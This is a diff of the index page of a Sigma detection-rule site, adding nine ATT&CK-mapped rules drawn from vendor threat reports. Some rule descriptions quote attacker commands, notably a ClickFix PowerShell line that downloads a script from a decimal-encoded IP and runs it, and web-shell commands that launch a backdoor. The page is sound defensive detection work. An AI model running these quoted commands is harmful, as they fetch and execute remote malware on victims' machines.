@@ -4,9 +4,9 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>eeps-sigma · Sigma detections from primary threat research</title>
-<meta name="description" content="9 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
+<meta name="description" content="18 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
 <meta property="og:title" content="eeps-sigma · Sigma detections from primary threat research">
-<meta property="og:description" content="9 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
+<meta property="og:description" content="18 behaviour-based, ATT&amp;CK-mapped Sigma detection rules built from primary threat research by Esmond Er.">
 <meta name="author" content="Esmond Er">
 <link rel="icon" href="assets/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -41,10 +41,10 @@
     </div>
     
     <dl class="stats">
-      <div><dt>Published rules</dt><dd>9</dd></div>
-      <div><dt>ATT&amp;CK techniques</dt><dd>11</dd></div>
+      <div><dt>Published rules</dt><dd>18</dd></div>
+      <div><dt>ATT&amp;CK techniques</dt><dd>19</dd></div>
       <div><dt>Platforms</dt><dd>4</dd></div>
-      <div><dt>Last updated</dt><dd class="dd-date">2026-09-28</dd></div>
+      <div><dt>Last updated</dt><dd class="dd-date">2026-10-01</dd></div>
     </dl>
   </div>
 </section>
@@ -84,7 +84,7 @@
   <div class="wrap">
     <h2>ATT&amp;CK coverage</h2>
     <p class="muted">Published rules by tactic, current ATT&amp;CK Enterprise release.</p>
-    <ul class="tactics"><li class=""><span class="t-name">Reconnaissance</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Resource Development</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Initial Access</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Execution</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Persistence</span><span class="t-bar"><i style="width:100%"></i></span><span class="t-n">3</span></li><li class=""><span class="t-name">Privilege Escalation</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Stealth</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Defense Impairment</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">1</span></li><li class=""><span class="t-name">Credential Access</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Discovery</span><span class="t-bar"><i style="width:67%"></i></span><span class="t-n">2</span></li><li class=""><span class="t-name">Lateral Movement</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Collection</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Command and Control</span><span class="t-bar"><i style="width:67%"></i></span><span class="t-n">2</span></li><li class=""><span class="t-name">Exfiltration</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Impact</span><span class="t-bar"><i style="width:67%"></i></span><span class="t-n">2</span></li></ul>
+    <ul class="tactics"><li class=""><span class="t-name">Reconnaissance</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Resource Development</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Initial Access</span><span class="t-bar"><i style="width:17%"></i></span><span class="t-n">1</span></li><li class="on"><span class="t-name">Execution</span><span class="t-bar"><i style="width:50%"></i></span><span class="t-n">3</span></li><li class="on"><span class="t-name">Persistence</span><span class="t-bar"><i style="width:83%"></i></span><span class="t-n">5</span></li><li class=""><span class="t-name">Privilege Escalation</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Stealth</span><span class="t-bar"><i style="width:67%"></i></span><span class="t-n">4</span></li><li class="on"><span class="t-name">Defense Impairment</span><span class="t-bar"><i style="width:17%"></i></span><span class="t-n">1</span></li><li class=""><span class="t-name">Credential Access</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Discovery</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">2</span></li><li class=""><span class="t-name">Lateral Movement</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class=""><span class="t-name">Collection</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Command and Control</span><span class="t-bar"><i style="width:100%"></i></span><span class="t-n">6</span></li><li class=""><span class="t-name">Exfiltration</span><span class="t-bar"><i style="width:0%"></i></span><span class="t-n">0</span></li><li class="on"><span class="t-name">Impact</span><span class="t-bar"><i style="width:33%"></i></span><span class="t-n">2</span></li></ul>
   </div>
 </section>
 
@@ -149,6 +149,26 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-09-26</span>
       </a>
+      <a class="rule-row" href="rules/image_load_win_needymantis_loader_dll_sideload_from_masquerading_folder.html" data-level="high" data-product="windows"
+         data-search="needymantis loader dll sideload from masquerading folder t1574.001 image_load detects loading of a dll from one of the folder/file pairs microsoft lists as used by the first-stage loader of the needymantis malware family (used by at least storm-3069). the loader masquerades as a dll required by legitimate open-source software (curl, vim, tightvnc and others) packaged alongside it and is loaded through dll sideloading from vendor-lookalike folders under programdata or program files (e.g. programdata\usoshared\libcurl.dll, programdata\vim\vim64.dll, programdata\ics\nvml.dll). scope decisions: the reported programdata\intel\jli.dll and programdata\office|broadcom\dbghelp.dll loads are omitted because sigmahq&#x27;s generic jli.dll and dbghelp.dll sideloading rules already alert on them; program files\poedit\winsparkle.dll is omitted because it is the legitimate install path of poedit&#x27;s winsparkle update component and the report gives no signer or hash to tell the spoofed copy apart.">
+        <span class="rr-main">
+          <span class="rr-title">NeedyMantis Loader DLL Sideload From Masquerading Folder</span>
+          <span class="rr-sub">Windows · image load</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1574.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-01</span>
+      </a>
+      <a class="rule-row" href="rules/file_event_win_needymantis_loader_dll_written_to_masquerading_folder.html" data-level="high" data-product="windows"
+         data-search="needymantis loader dll written to masquerading folder t1036.005 file_event detects creation of a dll at one of the folder/file pairs microsoft lists as used by the first-stage loader of the needymantis malware family (used by at least storm-3069), which is written under the name of a library required by legitimate software (libcurl.dll, vim64.dll, dbghelp.dll, jli.dll, nvml.dll) into vendor-lookalike folders under programdata or program files, ahead of dll sideloading. mirrors the devicefileevents hunting query published in the report. artifact-level: the actor can change folder names. program files\poedit\winsparkle.dll (and its x86 variant) from the same hunting query is deliberately excluded because every legitimate poedit install or update writes that file.">
+        <span class="rr-main">
+          <span class="rr-title">NeedyMantis Loader DLL Written To Masquerading Folder</span>
+          <span class="rr-sub">Windows · file event</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1036.005</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-01</span>
+      </a>
       <a class="rule-row" href="rules/proc_creation_win_peoplesoft_war_directory_payload_execution.html" data-level="high" data-product="windows"
          data-search="payload execution from oracle peoplesoft web application archive directory t1059.003 t1057 t1083 process_creation detects execution of, or command lines referencing, an executable inside the peoplesoft psemhub.war or portal.war web application directory, and command lines referencing the sideeye loader name ple64. through a web shell, unc6240 (shinyhunters) checked the reassembled file size (for %f in (applications\peoplesoft\psemhub.war\ple64.exe) do @echo %~zf), launched it in the background (cmd.exe /c start /b &quot;&quot; applications\peoplesoft\psemhub.war\ple64.exe) and polled for it (tasklist | findstr /i ple64). the directory-based selections are ttp-level; the ple64 selection is an artifact and is trivially renamed.">
         <span class="rr-main">
@@ -158,6 +178,36 @@
         <span class="rr-tech"><span class="chip">T1059.003</span> <span class="chip">T1057</span> <span class="chip">T1083</span></span>
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-09-26</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_win_powershell_irm_decimal_ip_host.html" data-level="high" data-product="windows"
+         data-search="powershell invoke-restmethod to decimal-encoded ip host t1105 t1059.001 process_creation detects a command line in which powershell&#x27;s invoke-restmethod (alias irm) targets a host written as a single decimal integer instead of a dotted ipv4 address (8 to 10 digits, the range of a decimal-encoded ipv4 address), e.g. &quot;irm 1614733393/12&quot;. huntress reports an unattributed clickfix campaign in which the pasted command was powershell.exe -executionpolicy bypass &quot;irm 1614733393/12 | out-file $env:temp\1777.ps1;&amp; $env:temp\1777.ps1&quot;, noting that the host is written as a decimal number rather than a dotted ip. sigmahq &quot;obfuscated ip download activity&quot; matches the reported sample only via its octal clause, because the leading digits happen to be 0-7; it does not match decimal hosts generally. sigmahq &quot;suspicious invoke-webrequest execution with directip&quot; requires &#x27;://&#x27; in the command line.">
+        <span class="rr-main">
+          <span class="rr-title">PowerShell Invoke-RestMethod To Decimal-Encoded IP Host</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1105</span> <span class="chip">T1059.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-01</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_win_python_client_py_from_users_public_indigo.html" data-level="high" data-product="windows"
+         data-search="python tunneling implant client.py executed from users public indigo folder t1572 process_creation detects a process whose image is located in \users\public\indigo\ and whose command line references client.py. sophos x-ops reports that in the stac4924 campaign (terminalfix lures leading to lorem ipsum loader) the malware deployed a portable python runtime to the users\public\indigo directory by downloading the legitimate python embedded package from python.org, and the runtime was used to execute client.py, a custom tunneling implant that opens an encrypted websocket connection to attacker-controlled servers to relay traffic into the network. the report does not name the python executable, so the rule keys on the folder and script name. sophos tracks the campaign as stac4924 and assesses with moderate confidence that its two phases are linked to the same threat group or to closely associated threat actors.">
+        <span class="rr-main">
+          <span class="rr-title">Python Tunneling Implant Client.py Executed From Users Public Indigo Folder</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1572</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-01</span>
+      </a>
+      <a class="rule-row" href="rules/registry_set_win_run_key_value_set_by_sdiagnhost.html" data-level="high" data-product="windows"
+         data-search="run key value set by scripted diagnostics host sdiagnhost.exe t1547.001 t1218 registry_set detects the windows scripted diagnostics native host (sdiagnhost.exe) writing a value under a currentversion\run key. cisco talos reports that the antino backdoor, delivered by uat-11587 (which talos assesses with high confidence is china-nexus), proxies its add_to_run persistence through scripted diagnostics: it instantiates the cscripteddiag com class (sdiageng.dll), writes an attacker-controlled powershell script, and the engine delegates execution to &quot;%windir%\syswow64\sdiagnhost.exe -embedding&quot;, which executes result.ps1. the resulting hkcu run value launches the antino executable at the next user sign-in. troubleshooting packs hosted by sdiagnhost.exe do not normally create autostart entries, so a run value written by this process is anomalous. the rule assumes the run value is written by the powershell runspace hosted inside sdiagnhost.exe; a script that instead spawns reg.exe would be attributed to that child (sigmahq &quot;sdiagnhost calling suspicious child process&quot; covers sdiagnhost spawning powershell/cmd/rundll32 etc.).">
+        <span class="rr-main">
+          <span class="rr-title">Run Key Value Set By Scripted Diagnostics Host Sdiagnhost.EXE</span>
+          <span class="rr-sub">Windows · registry set</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1547.001</span> <span class="chip">T1218</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-01</span>
       </a>
       <a class="rule-row" href="rules/file_event_win_peoplesoft_war_directory_suspicious_file_write.html" data-level="high" data-product="windows"
          data-search="suspicious file written to oracle peoplesoft web application archive directory - windows t1505.003 t1105 file_event detects creation of jsp, jspx or exe files inside the peoplesoft psemhub.war or portal.war web application directories. unc6240 (shinyhunters) exploited psemhub (cve-2026-35273), wrote web shells (x.jsp, u.jsp and sequentially numbered jsps) and other unexpected files such as tunnel.jsp and tunnel.jspx into psemhub.war, then uploaded ple64.exe, a trojanized installer delivering the sideeye backdoor, in chunks through u.jsp and reassembled it in the same directory. the report does not name the process that writes these files, so the rule does not filter on image.">
@@ -169,6 +219,16 @@
         <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
         <span class="rr-date">2026-09-28</span>
       </a>
+      <a class="rule-row" href="rules/image_load_win_cotfilereadapp_unsigned_ceiinfolog_dll_load.html" data-level="high" data-product="windows"
+         data-search="unsigned ceiinfolog.dll loaded by canon cotfilereadapp.exe t1574.001 image_load detects the canon-signed cotfilereadapp.exe loading an unsigned ceiinfolog.dll, a dll sideloading pattern. huntress reports an unattributed clickfix campaign (lures delivered through a malicious chatgpt custom gpt) in which an msi installed cotfilereadapp.exe into %localappdata%\programs\advanced printer configuration reader\ next to a malicious ceiinfolog.dll; the payload was a remote access trojan that the report does not name. huntress lists &quot;an unsigned ceiinfolog.dll ... in the same folder as cotfilereadapp.exe&quot; as an indicator. the rule keys on the signature status reported by sysmon eid 7 and does not depend on the actor-chosen install folder. the later v2 variant moved to a different signed host (stardock deelevate64.exe) and is not covered.">
+        <span class="rr-main">
+          <span class="rr-title">Unsigned Ceiinfolog.DLL Loaded By Canon COTFileReadApp.EXE</span>
+          <span class="rr-sub">Windows · image load</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1574.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-high">High</span></span>
+        <span class="rr-date">2026-10-01</span>
+      </a>
       <a class="rule-row" href="rules/azure_resource_lock_deleted.html" data-level="medium" data-product="azure"
          data-search="azure resource lock deleted t1490 activitylogs detects deletion attempts (successful or failed) of azure resource management locks. storm-3168 used a compromised service principal to make multiple unsuccessful attempts to delete azure site recovery and azure backup protection locks protecting storage accounts, alongside mass deletion of storage accounts, to impair recovery. the report describes the action but does not name the operation; microsoft.authorization/locks/delete is the standard arm operation for lock deletion. both success and failure are matched on purpose. treat a service principal caller, or deletion of site recovery or backup protection locks on storage accounts, as higher priority.">
         <span class="rr-main">
@@ -179,6 +239,26 @@
         <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
         <span class="rr-date">2026-09-28</span>
       </a>
+      <a class="rule-row" href="rules/web_netscaler_vpn_media_scripts_spoofed_404_large_response.html" data-level="medium" data-product="web"
+         data-search="citrix netscaler vpn media or scripts request with spoofed 404 and large response t1505.003 webserver detects requests to /vpn/media/*.ico or /vpn/scripts/ on a citrix netscaler adc/gateway web server that return http 404 with a response body larger than 5000 bytes. gtig/mandiant report post-exploitation of cve-2026-88772 by an unnamed actor who staged php web shells (.deb/.sig) under /netscaler/gui/vpn/scripts/linux, aliased /vpn/media/&lt;name&gt;.ico to them, and had them (including whipshot) return a spoofed &quot;404 not found&quot; while carrying tunneled data in the body. the report recommends hunting for &quot;404 responses to /vpn/media/*.ico or /vpn/scripts/ paths that return multi-kb response bodies&quot;; the 5000-byte threshold is taken from the report&#x27;s grep of /var/log/httpaccess.log. requires the appliance apache access log (or equivalent web logging) with path, status and response size parsed into w3c-style fields.">
+        <span class="rr-main">
+          <span class="rr-title">Citrix NetScaler VPN Media Or Scripts Request With Spoofed 404 And Large Response</span>
+          <span class="rr-sub">Web server · webserver</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1505.003</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-01</span>
+      </a>
+      <a class="rule-row" href="rules/proxy_needymantis_firefox_21_user_agent.html" data-level="medium" data-product="web"
+         data-search="needymantis firefox 21 user-agent t1071.001 proxy detects http(s) requests whose user-agent contains &quot;firefox/21.0&quot;. microsoft reports that the implant of the needymantis malware family (used by at least storm-3069) has a hard-coded user-agent of firefox/21.0 for its c2 connection, which is later converted to websockets. firefox 21 dates from 2013, so genuine browser traffic with this version is rare in modern environments. requires proxy or tls-inspection logs that record the user-agent of https requests. matching is case-insensitive, covering both &quot;firefox/21.0&quot; (report prose) and &quot;firefox/21.0&quot; (report hunting query).">
+        <span class="rr-main">
+          <span class="rr-title">NeedyMantis Firefox 21 User-Agent</span>
+          <span class="rr-sub">Web server · proxy</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1071.001</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-medium">Medium</span></span>
+        <span class="rr-date">2026-10-01</span>
+      </a>
       <a class="rule-row" href="rules/azure_storage_account_deleted.html" data-level="low" data-product="azure"
          data-search="azure storage account deleted t1485 t1490 activitylogs detects deletion attempts of azure storage accounts. this is a base rule for threshold alerting. storm-3168 used a compromised service principal to make 100+ storage account deletion attempts in a destructive sequence lasting about 7 minutes; most targeted storage accounts were deleted, and deletion attempts were also made against azure site recovery and azure backup protection locks protecting storage accounts. recommended aggregation: alert when one caller produces deletion attempts against 10+ distinct resourceid values (count success and failure; exclude start/accept events to avoid double counting) within 10 minutes. raise severity when resourceid contains backup, recovery or asr, or when the target is one of the site recovery related storage accounts. the operationname is the standard arm operation for storage account deletion.">
         <span class="rr-main">
@@ -188,6 +268,16 @@
         <span class="rr-tech"><span class="chip">T1485</span> <span class="chip">T1490</span></span>
         <span class="rr-lvl"><span class="lvl lvl-low">Low</span></span>
         <span class="rr-date">2026-09-28</span>
+      </a>
+      <a class="rule-row" href="rules/proc_creation_win_msp360_rmm_agent_spawns_powershell.html" data-level="low" data-product="windows"
+         data-search="powershell spawned by msp360 rmm agent t1059.001 t1219.002 process_creation detects powershell launched by the msp360 rmm agent service (rmm.agent.exe). microsoft observed unattributed phishing campaigns that distributed the legitimate msp360 rmm installer under deceptive names; after installation &quot;the newly installed rmm.agent.exe service launched powershell&quot;, which changed the session execution policy and downloaded clientsetup.msi (screenconnect) with invoke-webrequest, then installed it silently with msiexec /qn. the report&#x27;s hunting query notes the spawned powershell command line is just &quot;powershell.exe&quot; (commands supplied without arguments), so enable script block logging to see the payload. most useful in environments where msp360 is not a sanctioned rmm tool.">
+        <span class="rr-main">
+          <span class="rr-title">PowerShell Spawned By MSP360 RMM Agent</span>
+          <span class="rr-sub">Windows · process creation</span>
+        </span>
+        <span class="rr-tech"><span class="chip">T1059.001</span> <span class="chip">T1219.002</span></span>
+        <span class="rr-lvl"><span class="lvl lvl-low">Low</span></span>
+        <span class="rr-date">2026-10-01</span>
       </a>
     <p class="empty" hidden data-empty>No rules match that filter.</p>
   </div>
